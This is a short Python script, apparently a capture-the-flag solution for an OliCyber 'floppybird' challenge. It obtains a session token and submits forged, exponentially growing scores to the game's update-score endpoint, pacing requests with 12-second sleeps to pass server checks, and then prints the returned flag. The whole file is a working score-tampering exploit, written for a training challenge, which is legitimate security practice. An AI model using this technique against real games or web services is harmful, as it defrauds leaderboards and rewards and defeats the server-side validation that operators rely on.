from requests import session
from time import sleep
from tqdm import trange

URL = 'http://floppybird.challs.olicyber.it/'
s = session()

token = s.get(URL + 'get-token').json()['token']
print(token)

score = 1

s.post(URL + 'update-score', json={'token': token, 'score': score})

for i in trange(1, 11):
    sleep(12)
    
    score = 2** i
    res = s.post(URL + 'update-score', json={'token': token, 'score': score})

    if i == 10:
        print(res.json()['flag'])
    